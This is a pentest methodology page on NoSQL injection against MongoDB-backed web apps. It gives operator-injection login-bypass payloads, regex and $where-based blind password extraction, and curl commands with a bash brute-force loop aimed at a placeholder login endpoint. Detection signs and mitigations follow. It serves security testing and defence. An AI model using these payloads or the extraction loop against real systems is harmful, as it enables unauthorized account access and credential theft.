% Filename: 04-web-testing/injection/nosql-injection.md
% Display name: NoSQL Injection
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application)
% Authors: @TristanInSec

# NoSQL Injection

## Overview

NoSQL injection exploits applications that build NoSQL database queries from unsanitized user input. Unlike SQL injection which targets relational databases, NoSQL injection targets document stores (MongoDB), key-value stores (Redis), and other non-relational databases. The most common variant targets MongoDB through operator injection in JSON-based query parameters.

NoSQL databases don't use SQL, but they have their own query operators and languages that are equally injectable when user input is not properly handled.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application

## Prerequisites

- Application uses a NoSQL database (MongoDB is the most common target)
- User input is incorporated into database queries without sanitization
- Query operators or JavaScript expressions are accepted in input

## Detection Methodology

### Identifying NoSQL Targets

NoSQL injection is most common in:

- Node.js/Express applications using MongoDB (via Mongoose or native driver)
- Python applications using PyMongo
- PHP applications using MongoDB driver
- Any REST API accepting JSON input where values reach database queries
- Applications using Redis, CouchDB, or other NoSQL databases

Indicators of a MongoDB back-end:
- JSON-heavy API responses
- Object IDs in the format `507f1f77bcf86cd799439011` (24-character hex strings)
- Error messages mentioning "MongoError", "BSON", or "ObjectId"
- Node.js/Express stack traces

### Boundary Testing

Inject MongoDB operators and observe behavior changes:

```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

In URL-encoded form parameters:

```text
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
```

If `$ne` (not equal) with `invalid` logs in successfully, the application is vulnerable — the query matches any user whose username and password are not `invalid`.

## Techniques

### Operator Injection — Authentication Bypass

MongoDB query operators start with `$`. When user input is inserted directly into a query object, attackers can replace string values with operator objects.

**Vulnerable code pattern (Node.js):**

```javascript
// Application builds query from POST body
db.collection('users').findOne({
    username: req.body.username,
    password: req.body.password
});
```

If the application accepts JSON input (or PHP/Express parses `param[$operator]` syntax), the attacker controls the query structure.

**$ne (not equal) bypass:**

```json
{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
```

Query becomes: find a user where username is not empty AND password is not empty — returns the first matching user.

**$gt (greater than) bypass:**

```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```

Returns the `admin` user if their password is greater than empty string (always true).

**$regex bypass:**

```json
{
  "username": "admin",
  "password": {"$regex": ".*"}
}
```

Matches any password value for the admin user.

### Operator Injection — Data Extraction

**Blind extraction with $regex (character by character):**

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
{"username": "admin", "password": {"$regex": "^p"}}
{"username": "admin", "password": {"$regex": "^pa"}}
{"username": "admin", "password": {"$regex": "^pas"}}
```

If login succeeds with `^p` but fails with `^a` through `^o`, the password starts with `p`. Continue character by character.

URL-encoded form:

```text
username=admin&password[$regex]=^a
username=admin&password[$regex]=^b
username=admin&password[$regex]=^p
```

**Enumerating usernames:**

```json
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
```

**Length detection:**

```json
{"username": "admin", "password": {"$regex": "^.{6}$"}}
{"username": "admin", "password": {"$regex": "^.{7}$"}}
{"username": "admin", "password": {"$regex": "^.{8}$"}}
```

When the regex matches (login succeeds), you know the password length.

### JavaScript Injection

Some MongoDB operations accept JavaScript expressions (e.g., `$where` clauses). If user input reaches a `$where`, full JavaScript injection is possible.

**$where injection:**

```json
{"$where": "this.username == 'admin' && this.password == 'test'"}
```

Injecting into the password field:

```json
{"username": "admin", "$where": "1==1"}
```

Or via string injection:

```text
test' || '1'=='1
```

If the application builds: `"this.password == '" + input + "'"`

Result: `"this.password == 'test' || '1'=='1'"` — always true.

**Time-based blind injection:**

```json
{"username": "admin", "$where": "if(this.password.match(/^a/)){sleep(5000)}"}
```

A 5-second delay confirms the password starts with `a`. Note: `sleep()` in MongoDB `$where` blocks the JavaScript execution thread.

**Data exfiltration via $where:**

```json
{"$where": "this.username == 'admin' && this.password.charAt(0) == 'p'"}
```

### URL-Encoded Parameter Injection

Many web frameworks (Express.js, PHP) parse `param[$operator]` URL syntax into nested objects automatically:

```bash
# Express.js and PHP parse this as: {username: {$ne: ""}}
username[$ne]=&password[$ne]=

# Array injection
username[$in][]=admin&username[$in][]=root&password[$ne]=

# Regex
username[$regex]=admin.*&password[$gt]=
```

This is the most common real-world NoSQL injection vector because it works through standard HTML forms and GET parameters — no JSON content type required.

### MongoDB-Specific Operators

Useful operators for injection:

| Operator | Purpose | Example |
|----------|---------|---------|
| `$ne` | Not equal | `{"field": {"$ne": ""}}` |
| `$gt` | Greater than | `{"field": {"$gt": ""}}` |
| `$lt` | Less than | `{"field": {"$lt": "~"}}` |
| `$gte` | Greater or equal | `{"field": {"$gte": ""}}` |
| `$in` | In array | `{"field": {"$in": ["a","b"]}}` |
| `$nin` | Not in array | `{"field": {"$nin": ["blocked"]}}` |
| `$regex` | Regular expression | `{"field": {"$regex": "^admin"}}` |
| `$exists` | Field exists | `{"field": {"$exists": true}}` |
| `$where` | JavaScript expression | `{"$where": "1==1"}` |

## Automated Testing

NoSQL injection testing is primarily manual. Some tools assist:

```bash
# Use curl for JSON-based testing
curl -X POST "http://target.com/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# URL-encoded operator injection
curl -X POST "http://target.com/login" \
  -d 'username[$ne]=&password[$ne]='

# Regex extraction (script example)
for c in {a..z} {0..9}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "http://target.com/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^${prefix}${c}\"}}")
  if [ "$response" = "302" ]; then
    echo "Found: ${prefix}${c}"
    prefix="${prefix}${c}"
  fi
done
```

## Detection Methods

### Network-Based Detection

- MongoDB operator syntax in HTTP parameters (`$ne`, `$gt`, `$regex`, `$where`, `$in`)
- Bracket notation in URL parameters (`param[$ne]`, `param[$gt]`)
- JSON request bodies containing objects where strings are expected
- JavaScript code fragments in request parameters (`sleep()`, `this.`, `match()`)

### Host-Based Detection

- MongoDB query logs showing operator injection patterns
- Queries with `$where` clauses containing unexpected JavaScript
- Database queries returning significantly more results than expected
- MongoDB profiler showing unusual regex patterns in queries

## Mitigation Strategies

- **Input type validation** — ensure query values are the expected type (string, not object). In Node.js: `if (typeof req.body.username !== 'string') return;`. Reject any input that is an object or array when a string is expected
- **Sanitize MongoDB operators** — strip or reject any input containing `$` prefix. Libraries like `mongo-sanitize` for Node.js remove keys starting with `$`
- **Avoid $where** — never use `$where` with user input. The `$where` operator executes arbitrary JavaScript and should be avoided entirely in user-facing queries
- **Use MongoDB query projection** — limit returned fields to only what's needed, reducing data exposure from successful injection
- **Parameterized queries** — use the MongoDB driver's query builder methods rather than constructing query objects from raw user input
- **Disable server-side JavaScript** — start MongoDB with `--noscripting` to disable JavaScript evaluation entirely (prevents `$where` and `$function` abuse)

## References

### Official Documentation

- [MongoDB - Comparison Query Operators](https://www.mongodb.com/docs/manual/reference/mql/query-predicates/comparison/)

### Pentest Guides & Research

- [OWASP - Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [PortSwigger Web Security Academy - NoSQL Injection](https://portswigger.net/web-security/nosql-injection)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
